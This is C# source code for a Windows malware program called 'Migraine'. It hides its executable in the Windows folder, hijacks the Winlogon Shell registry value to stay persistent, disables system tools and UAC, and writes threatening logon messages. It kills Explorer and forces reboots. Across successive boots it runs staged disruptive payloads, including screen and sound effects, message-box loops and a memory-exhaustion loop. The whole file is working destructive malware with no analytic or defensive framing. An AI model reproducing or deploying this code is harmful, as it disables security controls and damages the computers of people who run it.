using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Library;
using Microsoft.Win32;

namespace Migraine
{
    public static class Main
    {
        public static void Init()
        {
            RegistryKey key;
            if (File.Exists(variables.ExtractPath + "\\Boot1.bin"))
            {
                File.Delete(variables.ExtractPath + "\\Boot1.bin");
                File.Create(variables.ExtractPath + "\\Boot2.bin");

                new Thread(new ThreadStart(Payloads.IconDraw)).Start();
                new Thread(new ThreadStart(Payloads.RandomSounds)).Start();
                while (true) { }
            }
            else if (File.Exists(variables.ExtractPath + "\\Boot2.bin"))
            {
                File.Delete(variables.ExtractPath + "\\Boot2.bin");
                File.Create(variables.ExtractPath + "\\Boot3.bin");

                new Thread(new ThreadStart(Payloads.ArabicTaskbar)).Start();
                new Thread(new ThreadStart(Payloads.WindowBounce)).Start();
                while (true) { }
            }
            else if (File.Exists(variables.ExtractPath + "\\Boot3.bin"))
            {
                File.Delete(variables.ExtractPath + "\\Boot3.bin");
                File.Create(variables.ExtractPath + "\\Boot4.bin");

                new Thread(new ThreadStart(Payloads.Bounce)).Start();
                new Thread(new ThreadStart(Payloads.IconScatter)).Start();

                key = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                key.SetValue("legalnoticecaption", "Migraine");
                key.Close();

                key = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                key.SetValue("legalnoticetext", "You're system has been destroyed!");
                key.Close();

                SystemExec.RestartExplorer();

                while (true) { }
            }
            else if (File.Exists(variables.ExtractPath + "\\Boot4.bin"))
            {
                File.Delete(variables.ExtractPath + "\\Boot4.bin");
                File.Create(variables.ExtractPath + "\\Boot5.bin");

                RegistryEdits.Edit();

                SystemExec.RestartExplorer();

                new Thread(new ThreadStart(Payloads.RandomBeep)).Start();
                new Thread(new ThreadStart(Payloads.SetAllText)).Start();
                new Thread(new ThreadStart(Payloads.HideTaskbar)).Start();
                new Thread(new ThreadStart(Payloads.ShakeWindows)).Start();

                File.WriteAllBytes(variables.ExtractPath + "\\video0.mp4", Properties.Resources.video0);
                File.WriteAllBytes(variables.ExtractPath + "\\Trollform.mp4", Properties.Resources.Trollform);
                Process.Start(variables.ExtractPath + "\\Trollform.mp4");


                Thread.Sleep(45000);
                variables.swRunning = false;

                new Thread(new ThreadStart(Payloads.FlipWindowContents)).Start();

                Thread.Sleep(45000);
                variables.fwcRunning = false;

                new Thread(new ThreadStart(Payloads.Play216Looping)).Start();
                new Thread(new ThreadStart(Payloads.DrawColors)).Start();

                Thread.Sleep(45000);

                variables.dcRunning = false;
                variables.stRunning = false;

                new Thread(new ThreadStart(Payloads.RandomSounds)).Start();
                new Thread(new ThreadStart(Payloads.MessageBoxes)).Start();

                Thread.Sleep(45000);

                Process.Start(variables.ExtractPath + "\\video0.mp4");

                new Thread(new ThreadStart(Payloads.SetAllText)).Start();
                new Thread(new ThreadStart(Payloads.ShakeWindows)).Start();

                key = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                key.SetValue("legalnoticecaption", "Migraine");
                key.Close();

                key = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                key.SetValue("legalnoticetext", "Your system is disabled, have fun fixing it!");
                key.Close();

                Process.Start(variables.ExtractPath + "\\video0.mp4");

                var list = new List<byte[]>();
                while (true)
                {
                    list.Add(new byte[1024]);
                    Thread.Sleep(100);
                }
            }
            else if (File.Exists(variables.ExtractPath + "\\Boot5.bin"))
            {
                if (File.Exists(variables.ExtractPath + "\\FileDead.bin"))
                {
                    new Thread(new ThreadStart(Payloads.RandomBeep)).Start();
                    new Thread(new ThreadStart(Payloads.Play216Looping)).Start();
                    new Thread(new ThreadStart(Payloads.RandomSounds)).Start();

                    while (true)
                    {
                        MessageBox.Show("Welcome to the greatest day of your life!", "Migraine", MessageBoxButtons.OK);
                    }
                }
                else
                {
                    File.Create(variables.ExtractPath + "\\FileDead.bin");

                    new Thread(new ThreadStart(Payloads.RandomBeep)).Start();
                    new Thread(new ThreadStart(Payloads.Play216Looping)).Start();
                    new Thread(new ThreadStart(Payloads.RandomSounds)).Start();

                    while (true)
                    {
                        MessageBox.Show("Welcome to the greatest day of your life!", "Migraine", MessageBoxButtons.OK);
                    }
                }
            }
            else
            {
                File.Create(variables.ExtractPath + "\\Boot1.bin");

                File.Move(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\Migraine.exe");

                lib.HideFile(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\Migraine.exe");

                Thread.Sleep(2000);

                key = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
                key.SetValue("Shell", "explorer.exe, Migraine.exe", RegistryValueKind.String);
                key.Close();

                RegistryEdits.DisableTools();

                key = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                key.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
                key.Close();

                key = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                key.SetValue("legalnoticecaption", "Migraine");
                key.Close();

                key = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                key.SetValue("legalnoticetext", "You're system is infected and soon will be destroyed, Try to stay logged on as long a possible ;)");
                key.Close();

                SystemExec.KillExplorer();

                Thread.Sleep(1000);

                SystemExec.Reboot();
            }
        }
    }

    public static class SystemExec
    {
        public static void RestartExplorer()
        {
            var psi1 = new ProcessStartInfo("taskkill", "/f /im explorer.exe");
            CreateProcessNoWindow.Create(psi1);

            Thread.Sleep(1000);

            var psi2 = new ProcessStartInfo("explorer.exe");
            CreateProcessNoWindow.Create(psi2);
        }

        public static void KillExplorer()
        {
            var psi1 = new ProcessStartInfo("taskkill", "/f /im explorer.exe");
            CreateProcessNoWindow.Create(psi1);
        }

        public static void Reboot()
        {
            SetProcessCritical.RtlSetProcessIsCritical(0, 0, 0);

            var psi1 = new ProcessStartInfo("shutdown.exe", "-r -t 0");
            CreateProcessNoWindow.Create(psi1);
        }

        public static void BSOD()
        {
            var psi1 = new ProcessStartInfo("shutdown.exe", "-r -t 0");
            CreateProcessNoWindow.Create(psi1);
        }
    }
}